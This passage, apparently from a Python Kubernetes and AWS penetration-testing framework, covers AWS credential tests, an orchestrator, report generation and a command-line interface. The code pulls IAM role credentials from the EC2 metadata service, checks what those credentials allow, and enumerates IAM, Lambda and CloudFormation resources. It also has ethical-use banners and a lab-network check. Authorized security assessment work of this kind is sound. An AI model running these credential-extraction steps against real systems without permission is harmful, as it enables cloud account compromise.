                        "key_names": [kp['KeyName'] for kp in key_pairs.get('KeyPairs', [])]
                    },
                    remediation="Restrict EC2 key pair permissions"
                )
                
        except ClientError as e:
            if e.response['Error']['Code'] != 'UnauthorizedOperation':
                self.logger.debug(f"Key pairs test failed: {e}")
        except Exception as e:
            self.logger.error(f"Key pairs test error: {e}")
    
    async def _test_aws_credentials(self):
        """Test général des credentials AWS"""
        # Test d'accès aux métadonnées AWS standard
        metadata_endpoints = [
            f"http://{self.aws_metadata_ip}/latest/meta-data/iam/security-credentials/",
            f"http://{self.aws_metadata_ip}/latest/meta-data/placement/",
            f"http://{self.aws_metadata_ip}/latest/meta-data/instance-id"
        ]
        
        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
            for endpoint in metadata_endpoints:
                try:
                    async with session.get(endpoint) as response:
                        if response.status == 200:
                            data = await response.text()
                            
                            self.add_finding(
                                target=self.aws_metadata_ip,
                                service="aws_metadata",
                                phase=PhaseType.EKS_POD_IDENTITY.value,
                                vulnerability="AWS metadata service accessible",
                                severity=SeverityLevel.INFO,
                                description=f"AWS metadata endpoint accessible: {endpoint}",
                                evidence={
                                    "endpoint": endpoint,
                                    "response_data": data[:200] + "..." if len(data) > 200 else data
                                },
                                remediation="Block access to AWS metadata service if not needed"
                            )
                            
                            # If this is the credentials endpoint, try to extract role name
                            if "security-credentials" in endpoint and data:
                                await self._test_iam_role_credentials(session, data.strip())
                                
                except Exception as e:
                    self.logger.debug(f"AWS metadata access failed for {endpoint}: {e}")
    
    async def _test_iam_role_credentials(self, session, role_name):
        """Test d'extraction des credentials d'un rôle IAM"""
        try:
            creds_endpoint = f"http://{self.aws_metadata_ip}/latest/meta-data/iam/security-credentials/{role_name}"
            
            async with session.get(creds_endpoint) as response:
                if response.status == 200:
                    creds_data = await response.json()
                    
                    self.add_finding(
                        target=self.aws_metadata_ip,
                        service="aws_iam_credentials",
                        phase=PhaseType.EKS_POD_IDENTITY.value,
                        vulnerability="IAM role credentials extracted",
                        severity=SeverityLevel.HIGH,
                        description=f"Successfully extracted IAM role credentials for {role_name}",
                        evidence={
                            "role_name": role_name,
                            "access_key_id": creds_data.get('AccessKeyId', '')[:10] + "...",
                            "expiration": creds_data.get('Expiration', ''),
                            "type": creds_data.get('Type', '')
                        },
                        remediation="Review IAM role permissions and implement instance metadata service v2"
                    )
                    
                    # Test the extracted credentials
                    await self._test_extracted_credentials(creds_data)
                    
        except Exception as e:
            self.logger.debug(f"IAM role credentials extraction failed: {e}")
    
    async def _test_iam_permissions(self):
        """Test des permissions IAM avec les credentials par défaut"""
        try:
            # Use default credentials if available
            session = boto3.Session(region_name=self.config.aws_region)
            await self._test_iam_permissions_with_session(session)
            
        except NoCredentialsError:
            self.logger.debug("No AWS credentials available for IAM testing")
        except Exception as e:
            self.logger.error(f"IAM permissions test error: {e}")
    
    async def _test_iam_permissions_with_session(self, session):
        """Test des permissions IAM avec une session spécifique"""
        try:
            iam_client = session.client('iam')
            
            # Test list users
            try:
                users = iam_client.list_users()
                
                self.add_finding(
                    target="aws_iam",
                    service="aws_iam",
                    phase=PhaseType.EKS_POD_IDENTITY.value,
                    vulnerability="IAM user enumeration access",
                    severity=SeverityLevel.HIGH,
                    description="Can enumerate IAM users",
                    evidence={
                        "user_count": len(users.get('Users', [])),
                        "users": [user['UserName'] for user in users.get('Users', [])][:10]
                    },
                    remediation="Restrict IAM permissions to least privilege"
                )
                
            except ClientError as e:
                if e.response['Error']['Code'] == 'AccessDenied':
                    self.logger.debug("IAM list users access denied")
                else:
                    self.logger.debug(f"IAM users test failed: {e}")
            
            # Test list roles
            try:
                roles = iam_client.list_roles()
                
                self.add_finding(
                    target="aws_iam",
                    service="aws_iam",
                    phase=PhaseType.EKS_POD_IDENTITY.value,
                    vulnerability="IAM role enumeration access",
                    severity=SeverityLevel.MEDIUM,
                    description="Can enumerate IAM roles",
                    evidence={
                        "role_count": len(roles.get('Roles', [])),
                        "roles": [role['RoleName'] for role in roles.get('Roles', [])][:10]
                    },
                    remediation="Restrict IAM role enumeration permissions"
                )
                
            except ClientError as e:
                if e.response['Error']['Code'] != 'AccessDenied':
                    self.logger.debug(f"IAM roles test failed: {e}")
                    
            # Test list policies
            await self._test_iam_policies(iam_client)
            
        except Exception as e:
            self.logger.error(f"IAM permissions test error: {e}")
    
    async def _test_iam_policies(self, iam_client):
        """Test d'énumération des politiques IAM"""
        try:
            policies = iam_client.list_policies(Scope='Local', MaxItems=50)
            
            self.add_finding(
                target="aws_iam",
                service="aws_iam",
                phase=PhaseType.EKS_POD_IDENTITY.value,
                vulnerability="IAM policy enumeration access",
                severity=SeverityLevel.LOW,
                description="Can enumerate IAM policies",
                evidence={
                    "policy_count": len(policies.get('Policies', [])),
                    "policies": [policy['PolicyName'] for policy in policies.get('Policies', [])][:10]
                },
                remediation="Restrict IAM policy enumeration permissions"
            )
            
        except ClientError as e:
            if e.response['Error']['Code'] != 'AccessDenied':
                self.logger.debug(f"IAM policies test failed: {e}")
        except Exception as e:
            self.logger.error(f"IAM policies test error: {e}")
    
    async def _test_aws_privilege_escalation(self):
        """Test d'escalade de privilèges AWS"""
        escalation_techniques = [
            {
                "name": "IAM PassRole enumeration",
                "method": self._test_pass_role_escalation
            },
            {
                "name": "Lambda function enumeration",
                "method": self._test_lambda_escalation
            },
            {
                "name": "CloudFormation stack access",
                "method": self._test_cloudformation_escalation
            }
        ]
        
        for technique in escalation_techniques:
            try:
                await technique["method"]()
            except Exception as e:
                self.logger.debug(f"Privilege escalation test '{technique['name']}' failed: {e}")
    
    async def _test_pass_role_escalation(self):
        """Test d'escalade via iam:PassRole"""
        try:
            session = boto3.Session(region_name=self.config.aws_region)
            iam_client = session.client('iam')
            
            # Test if we can pass roles to other services
            # This is a simplified test - in practice, you'd try to create resources
            # that use other roles
            
            # List roles and check for dangerous trust relationships
            try:
                roles = iam_client.list_roles()
                
                for role in roles.get('Roles', []):
                    assume_role_policy = role.get('AssumeRolePolicyDocument', {})
                    
                    # Check for overly permissive trust relationships
                    if isinstance(assume_role_policy, str):
                        assume_role_policy = json.loads(assume_role_policy)
                    
                    for statement in assume_role_policy.get('Statement', []):
                        principal = statement.get('Principal', {})
                        
                        # Check for wildcard principals
                        if principal == '*' or principal.get('AWS') == '*':
                            self.add_finding(
                                target="aws_iam",
                                service="aws_iam",
                                phase=PhaseType.EKS_POD_IDENTITY.value,
                                vulnerability="Overly permissive IAM role trust relationship",
                                severity=SeverityLevel.HIGH,
                                description=f"Role {role['RoleName']} has overly permissive trust relationship",
                                evidence={
                                    "role_name": role['RoleName'],
                                    "principal": principal,
                                    "statement": statement
                                },
                                remediation="Restrict IAM role trust relationships to specific principals"
                            )
                            
            except ClientError as e:
                if e.response['Error']['Code'] != 'AccessDenied':
                    self.logger.debug(f"PassRole escalation test failed: {e}")
                    
        except Exception as e:
            self.logger.error(f"PassRole escalation test error: {e}")
    
    async def _test_lambda_escalation(self):
        """Test d'escalade via Lambda"""
        try:
            session = boto3.Session(region_name=self.config.aws_region)
            lambda_client = session.client('lambda')
            
            # Test list functions
            try:
                functions = lambda_client.list_functions()
                
                self.add_finding(
                    target="aws_lambda",
                    service="aws_lambda",
                    phase=PhaseType.EKS_POD_IDENTITY.value,
                    vulnerability="Lambda function enumeration access",
                    severity=SeverityLevel.LOW,
                    description="Can enumerate Lambda functions",
                    evidence={
                        "function_count": len(functions.get('Functions', [])),
                        "functions": [func['FunctionName'] for func in functions.get('Functions', [])][:10]
                    },
                    remediation="Restrict Lambda enumeration permissions"
                )
                
                # Check for functions with dangerous permissions
                for function in functions.get('Functions', []):
                    await self._analyze_lambda_function(lambda_client, function)
                    
            except ClientError as e:
                if e.response['Error']['Code'] != 'AccessDenied':
                    self.logger.debug(f"Lambda escalation test failed: {e}")
                    
        except Exception as e:
            self.logger.error(f"Lambda escalation test error: {e}")
    
    async def _analyze_lambda_function(self, lambda_client, function):
        """Analyse d'une fonction Lambda"""
        try:
            function_name = function['FunctionName']
            
            # Get function policy
            try:
                policy = lambda_client.get_policy(FunctionName=function_name)
                policy_doc = json.loads(policy['Policy'])
                
                # Check for overly permissive policies
                for statement in policy_doc.get('Statement', []):
                    principal = statement.get('Principal', {})
                    
                    if principal == '*' or principal.get('AWS') == '*':
                        self.add_finding(
                            target=f"lambda:{function_name}",
                            service="aws_lambda",
                            phase=PhaseType.EKS_POD_IDENTITY.value,
                            vulnerability="Lambda function with overly permissive policy",
                            severity=SeverityLevel.MEDIUM,
                            description=f"Lambda function {function_name} has overly permissive policy",
                            evidence={
                                "function_name": function_name,
                                "principal": principal,
                                "statement": statement
                            },
                            remediation="Restrict Lambda function resource policies"
                        )
                        
            except ClientError as e:
                if e.response['Error']['Code'] not in ['AccessDenied', 'ResourceNotFoundException']:
                    self.logger.debug(f"Lambda policy analysis failed for {function_name}: {e}")
                    
        except Exception as e:
            self.logger.error(f"Lambda function analysis error: {e}")
    
    async def _test_cloudformation_escalation(self):
        """Test d'escalade via CloudFormation"""
        try:
            session = boto3.Session(region_name=self.config.aws_region)
            cf_client = session.client('cloudformation')
            
            # Test list stacks
            try:
                stacks = cf_client.describe_stacks()
                
                self.add_finding(
                    target="aws_cloudformation",
                    service="aws_cloudformation",
                    phase=PhaseType.EKS_POD_IDENTITY.value,
                    vulnerability="CloudFormation stack enumeration access",
                    severity=SeverityLevel.LOW,
                    description="Can enumerate CloudFormation stacks",
                    evidence={
                        "stack_count": len(stacks.get('Stacks', [])),
                        "stacks": [stack['StackName'] for stack in stacks.get('Stacks', [])][:10]
                    },
                    remediation="Restrict CloudFormation permissions"
                )
                
            except ClientError as e:
                if e.response['Error']['Code'] != 'AccessDenied':
                    self.logger.debug(f"CloudFormation escalation test failed: {e}")
                    
        except Exception as e:
            self.logger.error(f"CloudFormation escalation test error: {e}")

# ============================================================================
# PHASE 5 - ORCHESTRATION AND REPORTING
# ============================================================================

class FrameworkOrchestrator:
    """Orchestrateur principal du framework"""
    
    def __init__(self, config: FrameworkConfig):
        self.config = config
        self.logger = logging.getLogger("FrameworkOrchestrator")
        self.modules = {}
        self.all_findings = []
        self.redis_orchestrator = RedisOrchestrator(config)
        self.start_time = None
        self.end_time = None
        
        # Initialize modules
        self._initialize_modules()
    
    def _initialize_modules(self):
        """Initialisation des modules"""
        self.modules = {
            PhaseType.INFRASTRUCTURE_DETECTION: InfrastructureScanner(self.config),
            PhaseType.CREDENTIAL_EXTRACTION: CredentialExtractor(self.config),
            PhaseType.KUBERNETES_EXPLOITATION: KubernetesExploiter(self.config),
            PhaseType.EKS_POD_IDENTITY: EKSPodIdentityTester(self.config)
        }
    
    async def run_full_assessment(self, targets: List[str], phases: List[PhaseType] = None):
        """Exécution complète de l'assessment"""
        self.start_time = datetime.utcnow()
        self.logger.info(f"Starting full security assessment at {self.start_time}")
        
        if phases is None:
            phases = list(PhaseType)
        
        try:
            # Connect to Redis if available
            await self.redis_orchestrator.connect()
            
            # Create output directory
            await self._setup_output_directory()
            
            # Phase 1: Infrastructure Detection
            if PhaseType.INFRASTRUCTURE_DETECTION in phases:
                await self._run_phase_1(targets)
            
            # Phase 2: Credential Extraction
            if PhaseType.CREDENTIAL_EXTRACTION in phases:
                await self._run_phase_2()
            
            # Phase 3: Kubernetes Exploitation (lab only)
            if PhaseType.KUBERNETES_EXPLOITATION in phases and self.config.lab_mode:
                await self._run_phase_3()
            
            # Phase 4: EKS Pod Identity (lab only)
            if PhaseType.EKS_POD_IDENTITY in phases and self.config.lab_mode:
                await self._run_phase_4()
            
            # Generate reports
            await self._generate_reports()
            
            self.end_time = datetime.utcnow()
            duration = self.end_time - self.start_time
            
            self.logger.info(f"Assessment completed in {duration}")
            self.logger.info(f"Total findings: {len(self.all_findings)}")
            
            return self.all_findings
            
        except Exception as e:
            self.logger.error(f"Assessment failed: {e}")
            raise
        finally:
            await self._cleanup()
    
    async def _setup_output_directory(self):
        """Configuration du répertoire de sortie"""
        output_path = Path(self.config.output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        
        # Create timestamped subdirectory
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        self.session_output_dir = output_path / f"assessment_{timestamp}"
        self.session_output_dir.mkdir(exist_ok=True)
        
        self.logger.info(f"Output directory: {self.session_output_dir}")
    
    async def _run_phase_1(self, targets: List[str]):
        """Exécution de la Phase 1 - Détection d'infrastructure"""
        self.logger.info("=== PHASE 1: Infrastructure Detection ===")
        
        scanner = self.modules[PhaseType.INFRASTRUCTURE_DETECTION]
        findings = await scanner.execute(targets)
        self.all_findings.extend(findings)
        
        # Store discovered targets for next phases
        self.discovered_targets = []
        for finding in findings:
            if finding.evidence.get('port') and finding.evidence.get('host'):
                target = Target(
                    host=finding.evidence['host'],
                    port=finding.evidence['port'],
                    service=ServiceType(finding.evidence.get('service_type', 'unknown')),
                    metadata=finding.evidence
                )
                self.discovered_targets.append(target)
        
        self.logger.info(f"Phase 1 completed: {len(findings)} findings, {len(self.discovered_targets)} targets discovered")
    
    async def _run_phase_2(self):
        """Exécution de la Phase 2 - Extraction de credentials"""
        self.logger.info("=== PHASE 2: Credential Extraction ===")
        
        if not hasattr(self, 'discovered_targets'):
            self.logger.warning("No targets from Phase 1, skipping Phase 2")
            return
        
        extractor = self.modules[PhaseType.CREDENTIAL_EXTRACTION]
        findings = await extractor.execute(self.discovered_targets)
        self.all_findings.extend(findings)
        
        self.logger.info(f"Phase 2 completed: {len(findings)} findings")
    
    async def _run_phase_3(self):
        """Exécution de la Phase 3 - Exploitation Kubernetes"""
        self.logger.info("=== PHASE 3: Kubernetes Exploitation (Lab Mode) ===")
        
        if not self.config.lab_mode:
            self.logger.warning("Phase 3 requires lab mode, skipping")
            return
        
        if not hasattr(self, 'discovered_targets'):
            self.logger.warning("No targets from Phase 1, skipping Phase 3")
            return
        
        # Filter Kubernetes targets
        k8s_targets = [t for t in self.discovered_targets 
                      if t.service in [ServiceType.KUBERNETES_API, ServiceType.KUBELET]]
        
        if not k8s_targets:
            self.logger.warning("No Kubernetes targets found, skipping Phase 3")
            return
        
        exploiter = self.modules[PhaseType.KUBERNETES_EXPLOITATION]
        findings = await exploiter.execute(k8s_targets)
        self.all_findings.extend(findings)
        
        self.logger.info(f"Phase 3 completed: {len(findings)} findings")
    
    async def _run_phase_4(self):
        """Exécution de la Phase 4 - EKS Pod Identity"""
        self.logger.info("=== PHASE 4: EKS Pod Identity Testing (Lab Mode) ===")
        
        if not self.config.lab_mode:
            self.logger.warning("Phase 4 requires lab mode, skipping")
            return
        
        eks_tester = self.modules[PhaseType.EKS_POD_IDENTITY]
        findings = await eks_tester.execute([])  # No specific targets needed
        self.all_findings.extend(findings)
        
        self.logger.info(f"Phase 4 completed: {len(findings)} findings")
    
    async def _generate_reports(self):
        """Génération des rapports"""
        self.logger.info("Generating reports...")
        
        # JSON Report
        if self.config.save_json:
            await self._generate_json_report()
        
        # CSV Report
        if self.config.save_csv:
            await self._generate_csv_report()
        
        # Summary Report
        await self._generate_summary_report()
        
        # Executive Summary
        await self._generate_executive_summary()
    
    async def _generate_json_report(self):
        """Génération du rapport JSON détaillé"""
        report_data = {
            "assessment_info": {
                "start_time": self.start_time.isoformat() if self.start_time else None,
                "end_time": self.end_time.isoformat() if self.end_time else None,
                "duration": str(self.end_time - self.start_time) if self.start_time and self.end_time else None,
                "framework_version": "1.0",
                "lab_mode": self.config.lab_mode,
                "total_findings": len(self.all_findings)
            },
            "statistics": self._generate_statistics(),
            "findings": [finding.to_dict() for finding in self.all_findings]
        }
        
        json_file = self.session_output_dir / "detailed_report.json"
        async with aiofiles.open(json_file, 'w') as f:
            await f.write(json.dumps(report_data, indent=2, default=str))
        
        self.logger.info(f"JSON report saved: {json_file}")
    
    async def _generate_csv_report(self):
        """Génération du rapport CSV"""
        csv_file = self.session_output_dir / "findings.csv"
        
        headers = [
            "ID", "Timestamp", "Target", "Service", "Phase", "Vulnerability",
            "Severity", "Description", "Evidence", "Remediation", "CVSS Score"
        ]
        
        async with aiofiles.open(csv_file, 'w', newline='') as f:
            # Write headers
            await f.write(','.join(headers) + '\n')
            
            # Write findings
            for finding in self.all_findings:
                row = finding.to_csv_row()
                # Escape commas and quotes in CSV
                escaped_row = []
                for field in row:
                    field_str = str(field)
                    if ',' in field_str or '"' in field_str:
                        field_str = '"' + field_str.replace('"', '""') + '"'
                    escaped_row.append(field_str)
                
                await f.write(','.join(escaped_row) + '\n')
        
        self.logger.info(f"CSV report saved: {csv_file}")
    
    async def _generate_summary_report(self):
        """Génération du rapport de résumé"""
        stats = self._generate_statistics()
        
        summary = f"""
# Kubernetes & Cloud Security Assessment Summary

## Assessment Information
- Start Time: {self.start_time.isoformat() if self.start_time else 'N/A'}
- End Time: {self.end_time.isoformat() if self.end_time else 'N/A'}
- Duration: {self.end_time - self.start_time if self.start_time and self.end_time else 'N/A'}
- Lab Mode: {self.config.lab_mode}
- Framework Version: 1.0

## Summary Statistics
- Total Findings: {stats['total_findings']}
- Critical: {stats['severity_counts']['critical']}
- High: {stats['severity_counts']['high']}
- Medium: {stats['severity_counts']['medium']}
- Low: {stats['severity_counts']['low']}
- Info: {stats['severity_counts']['info']}

## Findings by Phase
"""
        
        for phase, count in stats['phase_counts'].items():
            summary += f"- {phase.replace('_', ' ').title()}: {count}\n"
        
        summary += f"""
## Findings by Service
"""
        
        for service, count in stats['service_counts'].items():
            summary += f"- {service.replace('_', ' ').title()}: {count}\n"
        
        summary += f"""
## Top Vulnerabilities
"""
        
        for vuln, count in stats['top_vulnerabilities'][:10]:
            summary += f"- {vuln}: {count}\n"
        
        summary_file = self.session_output_dir / "summary.md"
        async with aiofiles.open(summary_file, 'w') as f:
            await f.write(summary)
        
        self.logger.info(f"Summary report saved: {summary_file}")
    
    async def _generate_executive_summary(self):
        """Génération du résumé exécutif"""
        stats = self._generate_statistics()
        
        critical_count = stats['severity_counts']['critical']
        high_count = stats['severity_counts']['high']
        total_high_critical = critical_count + high_count
        
        risk_level = "LOW"
        if total_high_critical >= 10:
            risk_level = "CRITICAL"
        elif total_high_critical >= 5:
            risk_level = "HIGH"
        elif total_high_critical >= 1:
            risk_level = "MEDIUM"
        
        executive_summary = f"""
# Executive Summary - Kubernetes & Cloud Security Assessment

## Overall Risk Assessment: {risk_level}

### Key Findings
- **{critical_count}** Critical vulnerabilities identified
- **{high_count}** High-severity vulnerabilities identified
- **{stats['total_findings']}** Total security findings

### Critical Issues Requiring Immediate Attention
"""
        
        critical_findings = [f for f in self.all_findings if f.severity == SeverityLevel.CRITICAL]
        for finding in critical_findings[:5]:  # Top 5 critical
            executive_summary += f"- {finding.vulnerability} on {finding.target}\n"
        
        executive_summary += f"""
### Recommendations
1. **Immediate Actions:**
   - Address all critical vulnerabilities within 24-48 hours
   - Implement network segmentation to limit exposure
   - Enable authentication on all exposed services

2. **Short-term Actions (1-2 weeks):**
   - Fix high-severity vulnerabilities
   - Implement proper RBAC configurations
   - Review and rotate credentials found in assessment

3. **Long-term Actions (1 month):**
   - Implement security monitoring and alerting
   - Regular security assessments and penetration testing
   - Security training for development and operations teams

### Compliance and Governance
- Review findings against your security policies
- Ensure compliance with relevant standards (SOC2, ISO27001, etc.)
- Document remediation efforts and timelines

### Next Steps
1. Prioritize remediation based on severity and business impact
2. Assign ownership for each finding
3. Set up regular security assessments
4. Monitor progress and verify fixes

**Assessment conducted by:** wKayaa Kubernetes Security Framework v1.0
**Date:** {datetime.utcnow().strftime('%Y-%m-%d')}
"""
        
        exec_file = self.session_output_dir / "executive_summary.md"
        async with aiofiles.open(exec_file, 'w') as f:
            await f.write(executive_summary)
        
        self.logger.info(f"Executive summary saved: {exec_file}")
    
    def _generate_statistics(self) -> Dict[str, Any]:
        """Génération des statistiques"""
        stats = {
            "total_findings": len(self.all_findings),
            "severity_counts": {level.value: 0 for level in SeverityLevel},
            "phase_counts": {phase.value: 0 for phase in PhaseType},
            "service_counts": {},
            "top_vulnerabilities": []
        }
        
        vulnerability_counts = {}
        
        for finding in self.all_findings:
            # Severity counts
            stats["severity_counts"][finding.severity.value] += 1
            
            # Phase counts
            stats["phase_counts"][finding.phase] += 1
            
            # Service counts
            service = finding.service
            stats["service_counts"][service] = stats["service_counts"].get(service, 0) + 1
            
            # Vulnerability counts
            vuln = finding.vulnerability
            vulnerability_counts[vuln] = vulnerability_counts.get(vuln, 0) + 1
        
        # Top vulnerabilities
        stats["top_vulnerabilities"] = sorted(
            vulnerability_counts.items(), 
            key=lambda x: x[1], 
            reverse=True
        )
        
        return stats
    
    async def _cleanup(self):
        """Nettoyage des ressources"""
        self.logger.info("Cleaning up resources...")
        
        # Close Redis connection if open
        if self.redis_orchestrator.redis_client:
            try:
                self.redis_orchestrator.redis_client.close()
            except:
                pass

# ============================================================================
# CLI INTERFACE
# ============================================================================

def setup_logging(level: str = "INFO"):
    """Configuration du logging global"""
    logging.basicConfig(
        level=getattr(logging, level),
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler('k8s_pentest.log')
        ]
    )

def signal_handler(signum, frame):
    """Gestionnaire de signaux pour arrêt propre"""
    print("\n[!] Interrupted by user, cleaning up...")
    sys.exit(0)

async def main():
    """Fonction principale"""
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    parser = argparse.ArgumentParser(
        description="Kubernetes & Cloud Penetration Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full assessment on CIDR range
  python k8s_pentest_framework.py -t 192.168.1.0/24 --lab-mode
  
  # Specific targets with selected phases
  python k8s_pentest_framework.py -t 10.0.0.1,10.0.0.2 -p infrastructure,credentials
  
  # EKS assessment only
  python k8s_pentest_framework.py -p eks --aws-region us-west-2 --lab-mode
  
⚠️  ETHICAL USE ONLY - Only use on systems you own or have explicit permission to test!
        """
    )
    
    parser.add_argument('-t', '--targets', 
                       help='Comma-separated list of targets (IPs, CIDR ranges)')
    parser.add_argument('-f', '--targets-file',
                       help='File containing targets (one per line)')
    parser.add_argument('-p', '--phases',
                       help='Comma-separated phases to run (infrastructure,credentials,exploitation,eks)',
                       default='infrastructure,credentials')
    parser.add_argument('--lab-mode', action='store_true',
                       help='Enable lab mode (required for exploitation phases)')
    parser.add_argument('--output-dir', default='./results',
                       help='Output directory for reports')
    parser.add_argument('--threads', type=int, default=100,
                       help='Number of threads for scanning')
    parser.add_argument('--timeout', type=int, default=30,
                       help='Timeout for network operations')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO', help='Logging level')
    parser.add_argument('--aws-region', default='us-east-1',
                       help='AWS region for EKS testing')
    parser.add_argument('--config-file',
                       help='YAML configuration file')
    
    args = parser.parse_args()
    
    # Setup logging
    setup_logging(args.log_level)
    logger = logging.getLogger("Main")
    
    try:
        # Load configuration
        config = FrameworkConfig()
        
        if args.config_file and os.path.exists(args.config_file):
            with open(args.config_file, 'r') as f:
                config_data = yaml.safe_load(f)
                for key, value in config_data.items():
                    if hasattr(config, key):
                        setattr(config, key, value)
        
        # Override with CLI arguments
        config.output_dir = args.output_dir
        config.thread_count = args.threads
        config.timeout = args.timeout
        config.log_level = args.log_level
        config.aws_region = args.aws_region
        config.lab_mode = args.lab_mode
        
        # Parse targets
        targets = []
        if args.targets:
            targets.extend([t.strip() for t in args.targets.split(',')])
        
        if args.targets_file and os.path.exists(args.targets_file):
            with open(args.targets_file, 'r') as f:
                targets.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
        
        # Parse phases
        phase_map = {
            'infrastructure': PhaseType.INFRASTRUCTURE_DETECTION,
            'credentials': PhaseType.CREDENTIAL_EXTRACTION,
            'exploitation': PhaseType.KUBERNETES_EXPLOITATION,
            'eks': PhaseType.EKS_POD_IDENTITY
        }
        
        requested_phases = []
        if args.phases:
            for phase_name in args.phases.split(','):
                phase_name = phase_name.strip().lower()
                if phase_name in phase_map:
                    requested_phases.append(phase_map[phase_name])
                else:
                    logger.warning(f"Unknown phase: {phase_name}")
        
        if not requested_phases:
            requested_phases = [PhaseType.INFRASTRUCTURE_DETECTION, PhaseType.CREDENTIAL_EXTRACTION]
        
        # Validation
        if not targets and PhaseType.EKS_POD_IDENTITY not in requested_phases:
            logger.error("No targets specified. Use -t or -f to specify targets.")
            sys.exit(1)
        
        if (PhaseType.KUBERNETES_EXPLOITATION in requested_phases or 
            PhaseType.EKS_POD_IDENTITY in requested_phases) and not config.lab_mode:
            logger.error("Exploitation and EKS phases require --lab-mode flag for safety.")
            sys.exit(1)
        
        # Print banner
        print_banner()
        
        # Validate targets are in allowed networks for lab mode
        if config.lab_mode and targets:
            allowed_targets = []
            for target in targets:
                if '/' in target:  # CIDR
                    try:
                        network = IPv4Network(target, strict=False)
                        for allowed_network in config.allowed_networks:
                            if network.subnet_of(IPv4Network(allowed_network)):
                                allowed_targets.append(target)
                                break
                        else:
                            logger.warning(f"Target {target} not in allowed lab networks")
                    except Exception as e:
                        logger.error(f"Invalid CIDR {target}: {e}")
                else:  # Single IP
                    try:
                        ip = IPv4Address(target)
                        for allowed_network in config.allowed_networks:
                            if ip in IPv4Network(allowed_network):
                                allowed_targets.append(target)
                                break
                        else:
                            logger.warning(f"Target {target} not in allowed lab networks")
                    except Exception as e:
                        logger.error(f"Invalid IP {target}: {e}")
            
            targets = allowed_targets
            if not targets and PhaseType.EKS_POD_IDENTITY not in requested_phases:
                logger.error("No valid targets in allowed lab networks")
                sys.exit(1)
        
        logger.info(f"Starting assessment with {len(targets)} targets and {len(requested_phases)} phases")
        logger.info(f"Phases: {[p.value for p in requested_phases]}")
        logger.info(f"Lab mode: {config.lab_mode}")
        
        # Initialize and run orchestrator
        orchestrator = FrameworkOrchestrator(config)
        findings = await orchestrator.run_full_assessment(targets, requested_phases)
        
        # Print summary
        print_summary(findings)
        
        logger.info("Assessment completed successfully")
        
    except KeyboardInterrupt:
        logger.info("Assessment interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Assessment failed: {e}")
        import traceback
        logger.debug(traceback.format_exc())
        sys.exit(1)

def print_banner():
    """Affichage du banner"""
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    Kubernetes & Cloud Security Framework                     ║
║                                  v1.0                                        ║
║                              by wKayaa                                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ⚠️  ETHICAL USE ONLY - AUTHORIZED TESTING ENVIRONMENTS ONLY ⚠️              ║
║                                                                              ║
║  This framework is designed for:                                             ║
║  • Authorized penetration testing                                           ║
║  • Security research in controlled environments                             ║
║  • Bug bounty programs with explicit permission                             ║
║                                                                              ║
║  DO NOT use against systems you don't own or have permission to test!       ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

[*] Framework initialized - Date: 2025-06-23 19:25:34 UTC
[*] User: wKayaa
"""
    print(banner)

def print_summary(findings: List[Finding]):
    """Affichage du résumé des résultats"""
    if not findings:
        print("\n[!] No findings to report")
        return
    
    # Count by severity
    severity_counts = {level.value: 0 for level in SeverityLevel}
    for finding in findings:
        severity_counts[finding.severity.value] += 1
    
    print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                             ASSESSMENT SUMMARY                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  Total Findings: {len(findings):>8}                                              ║
║                                                                              ║
║  Critical:       {severity_counts['critical']:>8}                                              ║
║  High:           {severity_counts['high']:>8}                                              ║
║  Medium:         {severity_counts['medium']:>8}                                              ║
║  Low:            {severity_counts['low']:>8}                                              ║
║  Info:           {severity_counts['info']:>8}                                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")
    
    # Show top critical/high findings
    critical_high = [f for f in findings if f.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]]
    if critical_high:
        print("\n[!] CRITICAL/HIGH SEVERITY FINDINGS:")
        for i, finding in enumerate(critical_high[:10], 1):
            print(f"  {i:2}. [{finding.severity.value.upper():>8}] {finding.vulnerability}")
            print(f"      Target: {finding.target}")
            print(f"      Phase:  {finding.phase}")
            print()
    
    print(f"[*] Detailed reports saved to: {findings[0].evidence.get('output_dir', './results')}")

# ============================================================================
# CONFIGURATION FILE TEMPLATE
# ============================================================================

def generate_config_template():
    """Génération d'un template de configuration"""
    config_template = """
# Kubernetes & Cloud Security Framework Configuration
# Save as config.yaml and use with --config-file

# Network scanning settings
thread_count: 100
timeout: 30
max_retries: 3
port_scan_timeout: 3
max_concurrent_scans: 1000

# Output settings
output_dir: "./results"
log_level: "INFO"
save_json: true
save_csv: true

# Redis orchestration (optional)
redis_host: "localhost"
redis_port: 6379
redis_db: 0

# AWS settings for EKS testing
aws_region: "us-east-1"
aws_profile: null

# Lab environment settings
lab_mode: true
allowed_networks:
  - "10.0.0.0/8"
  - "172.16.0.0/12"
  - "192.168.0.0/16"
  - "127.0.0.0/8"

# User agent for HTTP requests
user_agent: "KubeSecFramework/1.0"
"""
    
    with open("config_template.yaml", "w") as f:
        f.write(config_template.strip())
    
    print("Configuration template saved as config_template.yaml")

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

class PerformanceMonitor:
    """Moniteur de performance pour le framework"""
    
    def __init__(self):
        self.start_time = time.time()
        self.last_checkpoint = self.start_time
        self.checkpoints = {}
    
    def checkpoint(self, name: str):
        """Enregistrement d'un checkpoint"""
        current_time = time.time()
        elapsed = current_time - self.last_checkpoint
        total_elapsed = current_time - self.start_time
        
        self.checkpoints[name] = {
            "elapsed": elapsed,
            "total_elapsed": total_elapsed,
            "timestamp": current_time
        }
        
        self.last_checkpoint = current_time
        return elapsed
    
